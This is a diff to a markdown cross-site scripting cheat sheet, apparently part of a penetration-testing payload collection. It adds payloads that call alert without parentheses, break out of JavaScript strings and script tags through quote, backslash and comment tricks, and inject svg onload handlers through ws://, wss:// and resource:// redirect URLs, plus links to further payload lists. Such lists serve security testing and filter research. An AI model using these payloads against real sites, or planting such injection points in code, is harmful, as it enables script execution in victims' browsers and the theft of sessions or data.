@@ -123,7 +123,13 @@ test@example(<script>alert(0)</script>).com
 ```
 
 ### Without parentheses
+```
+alert`45`
+document.location="javascript:alert%2845%29"
+onerror=alert;throw 45
+```
 https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
+
 ```
 <svg/onload='alert&#40 23 &#41'> 
 location=/javascript:alert%2823%29/.source;
@@ -147,13 +153,48 @@ https://jlajara.gitlab.io/XSS_20_characters
 " onerror='alert(1)'
 ```
 
-## Escaping comments by closing tag 
+### In JS Injection Bypass
+
+#### With <!-- <script/
 ```html
 <script>
-  // comment </script>XSS
- /* comment </script>XSS
+  var test = "injection <!-- <script/";
+</script>
+
+<img src="</script><script>alert(origin)</script>">
+```
+#### With </script>
+```html
+<script>
+  var test = "</script><svg/onload=alert(45)>"
 </script>
 ```
+#### With double quot and plus (same for simple quotes)
+```
+<script>
+  var test = ""+alert(45)+""
+  // user input: "+alert(45)+"
+</script>
+```
+#### With backslash
+```
+<script>
+  var test = "\", test1="+alert(45)//input2"
+  // Original: var test = "input1", test1="input2"
+  // user input1: \
+  // user input2: +alert(45)//
+</script>
+```
+
+### 302 XSS 
+```
+ws://google.com"><svg/onload=alert(2)>
+wss://google.com"><svg/onload=alert(2)>
+resource://google.com"><svg/onload=alert(2)>
+```
+https://www.gremwell.com/firefox-xss-302<br>
+https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/
+
 
 ### Alert
 ```js
@@ -517,4 +558,5 @@ xmp
 - https://gist.github.com/xsuperbug/1aff5c1d5ddbfefb035f33dd9c8e8a72
 - https://netsec.expert/posts/xss-in-2021/#double-encoding
 - https://github.com/cujanovic/Markdown-XSS-Payloads/
+- https://www.hahwul.com/cullinan/xss/
 
